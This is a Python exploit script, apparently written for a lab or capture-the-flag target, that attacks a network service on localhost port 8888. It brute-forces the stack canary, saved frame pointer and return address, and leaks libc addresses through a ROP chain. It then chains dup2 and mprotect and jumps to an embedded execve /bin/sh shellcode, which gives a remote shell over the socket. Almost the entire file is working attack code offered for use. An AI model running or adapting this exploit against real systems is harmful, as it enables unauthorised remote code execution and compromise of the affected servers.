from utils import *
from roputils import *

# first way to exploit: 
# defeat ASLR/PIE, stack canary
# then construct rop chain to execute mprotect(ADDR, LEN, R_X) on stack address, then return to shellcode inserted at the beginning of the buffer
# 
# PROBLEM with this approach:
# when trying to leak the RBP saved on stack,
# it might falsely guess a wrong (smaller) value,
# because after the exit from handle_request,
# the function loads all the stack variables (the closing message string) from registers as immediate values
# and so, does not actually need to restore the correct RBP after exiting from handle_request
# the attacker-side checker functions validates brute-force attemps by checking received closing message strings
# which will sometimes be sent even if the RBP is not guessed correctly (as explained above)
#
# this means that the attacker can no longer rely on a fixed offset from the supposed leaked RBP to the buffer location
# so it might try to jump to an invalid location, instead of the beginning of the buffer where the shellcode is
#
# for this to not be a problem anymore, the "fake leaked" RBP must be at a fixed distance from the "real" RBP
# so that the buffer to "fake leaked" RBP distance is also constant

SERVER_IP = 'localhost'
SERVER_PORT = 8888

CANARY_OFFSET = 200
RBP_OFFSET = 208
RIP_OFFSET = 216

PAD_BYTE = b'A'

def try_byte(sock: socket.socket, byte_val, payload_prefix):

    payload = payload_prefix + byte_val

    sock.recv(1024)
    sock.send(payload)

    recvd = sock.recv(1024)

    if recvd != b"Request complete, Closing...\n":
        return None

    return byte_val

PAD = PAD_BYTE * CANARY_OFFSET

canary_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD, hints={0: [(b'\x00', b'\x00')]}, session_name="CANARY LEAK")
canary_bytes = canary_leaker.find_value()
#canary_bytes = b'\x00\xc9\xfe\x00 ~\x0e1'

RBP_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD + canary_bytes, 
                                    hints={5: [(b'\x7f', b'\x7f')], 6: [(b'\x00', b'\x00')], 7: [(b'\x00', b'\x00')]}, session_name="RBP LEAK")
RBP_bytes = RBP_leaker.find_value()
#RBP_bytes = b'\x80\xda:\x18\xfe\x7f\x00\x00'

RIP_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD + canary_bytes + RBP_bytes, 
                                    hints={0: [(b'\xa4', b'\xa4')], 1:[(bv, bv) for bv in bytes_start_with(b'\x06')]}, session_name="RIP LEAK")
RIP_bytes = RIP_leaker.find_value()
#RIP_bytes = b'\xa4VJ\xca\xf9U\x00\x00'

RIP_ORG_ADDR = 0x16a4
PIE_OFFSET = from_bytes(RIP_bytes) - RIP_ORG_ADDR

BASE_GOT_ADDR = 0x3f20 + PIE_OFFSET

WRITE_PLT_ADDR = 0x11b0 + PIE_OFFSET
POP_RDI_RET_ADDR = 0x1793 + PIE_OFFSET
POP_RSI_R15_RET_ADDR = 0x1791 + PIE_OFFSET
RET_ADDR = 0x1794 + PIE_OFFSET

BASE_LIBC_ADDR = 0x0
libc_db = LIBC_util(session_name="LIBC LEAK")

def leak_libc_addrs(to_leak):

    global BASE_LIBC_ADDR

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))

    app_rop_util = ROP_util("app", Platform.X86_64, session_name = "APP ROP SEARCH")
    app_rop_util.scout_for_gadgets()

    payload = app_rop_util.make_payload()
    payload.set_max_size(CANARY_OFFSET + 16 + 160)

    payload.add_padding(CANARY_OFFSET)
    payload.add_bytes(canary_bytes)
    payload.add_bytes(RBP_bytes)

    # at the moment of execution of ROP chain, RDI already has the client socket descriptor
    # so there is no need for loading it explicitly
    
    ch = next(app_rop_util.search_chain(f"rsi = {BASE_GOT_ADDR}", fixed_regs = ["rdi", "rdx"], max_search_cnt = 1))  
    ch.show()  # optional

    payload.add_chain(ch)
    payload.add_addr(WRITE_PLT_ADDR)

    payload = payload.build(chain_addr_offset = PIE_OFFSET)

    sock.recv(1024)
    sock.send(payload)

    recvd = sock.recv(1024)

    # extracting as much addresses as possible 
    # to narrow down as much as possible the list of possible libc versions

    write_addr = from_bytes(recvd[8 * 6: 8 * 7])
    htons_addr = from_bytes(recvd[8 * 10: 8 * 11])
    close_addr = from_bytes(recvd[8 * 12: 8 * 13])
    signal_addr = from_bytes(recvd[8 * 14: 8 * 15])
    exit_addr = from_bytes(recvd[8 * 20: 8 * 21])

    leaked_sym_dict = {"htons": htons_addr, "write": write_addr, 
                        "close": close_addr, "signal": signal_addr, "exit": exit_addr}

    libc_db.collect_leaked_symbols(leaked_sym_dict)
    libc_db.search_libc_version()

    libc_db.find_libc_base_addr()
    BASE_LIBC_ADDR = libc_db.assert_unicate_base_addr()

    libc_db.search_symbols_addrs(to_leak)
    libc_addrs = libc_db.assert_unicate_addrs()

    return libc_addrs

leaked = leak_libc_addrs(["str_bin_sh", "system", "dup2", "mprotect", "exit", "puts"])

# shellcode source: http://shell-storm.org/shellcode/files/shellcode-905.php
SHELLCODE = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf' + \
                b'\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54' + \
                b'\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

NOP = b'\x90'

# check the discussion at the beginning of this file,
# this sould be the buffer base offset if the RBP were to be "truly" leked
#BASE_BUF_ADDR = from_bytes(RBP_bytes) - 0x180

# during one of the tests, this happened to be the offset from the "false leaked" RBP
# which would, at first glance, suggest that the stack grows upwards
BASE_BUF_ADDR = from_bytes(RBP_bytes) + 0xd80 

LIBC_POP_RDX_R12_RET_ADDR = BASE_LIBC_ADDR + 0x11c371   # offset calculated depending on libc version; TODO: automate it

def execute_shell(leaked_addrs):

    # first, STDIN/STDOUT/STDERR is redirected with dup2(client socket descriptor, 0/1/2)
    # then, mprotect is called to defeat NX
    # then, the chain returns to the beginning of the overflowed buffer, that contains a shellcode

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))

    libc_db.download_libc_bin(libc_db.libc_version[0])
    libc_bin_name = f"{libc_db.libc_version[0]}.so"

    libc_rop_util = ROP_util(libc_bin_name, Platform.X86_64, session_name = "LIBC ROP SEARCH")
    libc_rop_util.scout_for_gadgets()

    payload = libc_rop_util.make_payload()
    payload.set_max_size(CANARY_OFFSET + 16 + 512)

    payload.add_bytes(SHELLCODE)
    payload.add_padding(200 - len(SHELLCODE))

    payload.add_bytes(canary_bytes)
    payload.add_bytes(RBP_bytes)
    payload.is_aligned_as(8)

    for dup_arg in range(3):

        ch = next(libc_rop_util.search_chain(f"rsi = {dup_arg}", fixed_regs = ["rdi", "rdx"], max_search_cnt = 1))
        ch.show()

        payload.add_chain(ch)
        payload.align_as(16)
        payload.add_addr(leaked_addrs["dup2"])

    ch = next(libc_rop_util.search_chain(f"rdi = {(BASE_BUF_ADDR // 0x1000) * 0x1000}, rsi = {0x1000}, rdx = {0x4 | 0x1 | 0x2}", 
                                            max_search_cnt = 1))
    ch.show()

    payload.add_chain(ch)
    payload.align_as(16)
    payload.add_addr(leaked_addrs["mprotect"])

    payload.align_as(16)
    payload.add_addr(BASE_BUF_ADDR)

    payload = payload.build(chain_addr_offset = BASE_LIBC_ADDR)

    sock.recv(1024)
    sock.send(payload)
    
    remote_shell(sock)

execute_shell(leaked)

